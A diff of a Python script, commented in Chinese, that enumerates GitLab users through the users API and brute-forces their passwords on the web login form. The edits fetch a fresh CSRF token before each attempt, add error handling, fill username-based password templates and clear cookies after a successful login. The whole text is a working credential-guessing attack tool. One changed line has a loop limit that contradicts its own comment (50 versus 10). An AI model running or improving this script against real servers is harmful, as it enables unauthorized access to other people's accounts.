@@ -29,7 +29,7 @@ def find_users():
     """Finds and returns a list of user data."""
     users = []
     print("正在尝试遍历用户")
-    for i in range(100):  # 限制最多请求前100个用户
+    for i in range(50):  # 限制最多请求前10个用户
         url = f"{gitlab_url}/api/v4/users/{i}"
         resdata = open_url(url)
         time.sleep(1)
@@ -61,10 +61,25 @@ def login(users):
         for password in passwords:
             time.sleep(1)  # 每次尝试之间等待1秒
             try:
+                # 重新获取登录页面以获取新的 CSRF 令牌
                 response = session.get(login_url, headers=headers)
+
+                # 检查响应状态码
+                if response.status_code != 200:
+                    print(f"请求登录页面失败，状态码: {response.status_code}，用户名: {username}")
+                    results.append((username, password, "请求登录页面失败"))
+                    break  # 跳出此用户的密码尝试
+
                 soup = BeautifulSoup(response.text, "html.parser")
-                authenticity_token = soup.find("input", {"name": "authenticity_token"})["value"]
+                authenticity_token_input = soup.find("input", {"name": "authenticity_token"})
                 
+                if not authenticity_token_input:
+                    print(f"未能找到 CSRF 令牌的输入字段，用户名: {username}")
+                    results.append((username, password, "未找到 CSRF 令牌"))
+                    break  # 跳出循环，尝试下一个用户
+
+                authenticity_token = authenticity_token_input["value"]
+
                 t_password = password.replace("{{username}}", username)
                 data = {
                     "utf8": "✓",
@@ -82,7 +97,8 @@ def login(users):
                     results.append((username, t_password, False))
                 elif login_response.status_code == 302:
                     print(f"成功登录 {username}。密码为 {t_password}。")
-                    results.append((username, t_password, True))
+                    # 清除session中的cookies
+                    session.cookies.clear()
                     break  # 登录成功后跳出密码尝试循环
                 else:
                     print(f"尝试登录 {username} 失败。")
@@ -110,4 +126,3 @@ if __name__ == "__main__":
             print(f"登录失败用户 {username}，密码为 {password}")
         else:
             print(result)  # 打印错误信息
-
